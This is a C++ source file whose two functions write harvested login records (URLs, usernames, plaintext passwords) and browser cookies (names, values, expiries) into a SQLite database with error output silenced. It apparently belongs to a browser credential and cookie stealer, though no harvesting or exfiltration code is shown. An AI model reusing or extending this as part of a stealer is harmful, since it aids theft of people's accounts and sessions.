#include "includes\DataDump.h"

bool dump_password_data(const std::string& db_path, std::vector<DataHolder> data_array, int data_index) {
	sqlite3* db;
	char* errorMessage = nullptr;

	// Open the database
	int rc = sqlite3_open(db_path.c_str(), &db);
	if (rc) {
		//std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
		return false;
	}

	// Create table if it doesn't exist
	const char* createTableSQL = "CREATE TABLE IF NOT EXISTS logins ("
		"id INTEGER PRIMARY KEY AUTOINCREMENT,"
		"url TEXT NOT NULL,"
		"username TEXT NOT NULL,"
		"password TEXT NOT NULL,"
		"host TEXT"
		");";

	rc = sqlite3_exec(db, createTableSQL, nullptr, nullptr, &errorMessage);
	if (rc != SQLITE_OK) {
		//std::cerr << "SQL error: " << errorMessage << std::endl;
		sqlite3_free(errorMessage);
		sqlite3_close(db);
		return false;
	}

	// Prepare insert statement
	const char* insertSQL = "INSERT INTO logins (url, username, password, host) VALUES (?, ?, ?, ?);";
	sqlite3_stmt* stmt;

	rc = sqlite3_prepare_v2(db, insertSQL, -1, &stmt, nullptr);
	if (rc != SQLITE_OK) {
		//std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
		sqlite3_close(db);
		return false;
	}

	std::string url_string;
	std::string username_string;
	std::string password_string;
	std::string host_string;

	// Bind the data and execute the statement
	for (int i = 0; i < data_index; ++i) {

		//c_str() doesn't work directly on function returns. It works with pointers
		url_string = data_array[i].getUrl();
		username_string = data_array[i].getUsername();
		password_string = data_array[i].getPassword();
		host_string = data_array[i].getHost();

		sqlite3_bind_text(stmt, 1, url_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 2, username_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 3, password_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 4, host_string.c_str(), -1, SQLITE_STATIC);

		rc = sqlite3_step(stmt);
		if (rc != SQLITE_DONE) {
			//std::cerr << "Execution failed: " << sqlite3_errmsg(db) << std::endl;
			sqlite3_finalize(stmt);
			sqlite3_close(db);
			return false;
		}

		// Reset the statement for the next iteration
		sqlite3_reset(stmt);
	}

	// Clean up
	sqlite3_finalize(stmt);
	sqlite3_close(db);
	return true;
}

bool dump_cookie_data(const std::string& db_path, std::vector<DataHolder> data_array, int data_index) {
	sqlite3* db;
	char* errorMessage = nullptr;

	// Open the database
	int rc = sqlite3_open(db_path.c_str(), &db);
	if (rc) {
		//std::cerr << "Can't open database: " << sqlite3_errmsg(db) << std::endl;
		return false;
	}

	// Create table if it doesn't exist
	const char* createTableSQL = "CREATE TABLE IF NOT EXISTS cookies ("
		"id INTEGER PRIMARY KEY AUTOINCREMENT,"
		"url TEXT NOT NULL,"
		"name TEXT NOT NULL,"
		"value TEXT NOT NULL,"
		"expiry TEXT NOT NULL,"
		"host TEXT"
		");";

	rc = sqlite3_exec(db, createTableSQL, nullptr, nullptr, &errorMessage);
	if (rc != SQLITE_OK) {
		//std::cerr << "SQL error: " << errorMessage << std::endl;
		sqlite3_free(errorMessage);
		sqlite3_close(db);
		return false;
	}

	// Prepare insert statement
	const char* insertSQL = "INSERT INTO cookies (url, name, value, expiry, host) VALUES (?, ?, ?, ?, ?);";
	sqlite3_stmt* stmt;

	rc = sqlite3_prepare_v2(db, insertSQL, -1, &stmt, nullptr);
	if (rc != SQLITE_OK) {
		//std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
		sqlite3_close(db);
		return false;
	}

	std::string url_string;
	std::string name_string;
	std::string value_string;
	std::string expiry_string;
	std::string host_string;

	// Bind the data and execute the statement
	for (int i = 0; i < data_index; ++i) {

		url_string = data_array[i].getUrl();
		name_string = data_array[i].getCookieName();
		value_string = data_array[i].getCookies();
		expiry_string = data_array[i].getCookieExpiry();
		host_string = data_array[i].getHost();

		sqlite3_bind_text(stmt, 1, url_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 2, name_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 3, value_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 4, expiry_string.c_str(), -1, SQLITE_STATIC);
		sqlite3_bind_text(stmt, 5, host_string.c_str(), -1, SQLITE_STATIC);

		rc = sqlite3_step(stmt);
		if (rc != SQLITE_DONE) {
			//std::cerr << "Execution failed: " << sqlite3_errmsg(db) << std::endl;
			sqlite3_finalize(stmt);
			sqlite3_close(db);
			return false;
		}

		// Reset the statement for the next iteration
		sqlite3_reset(stmt);
	}

	// Clean up
	sqlite3_finalize(stmt);
	sqlite3_close(db);
	return true;
}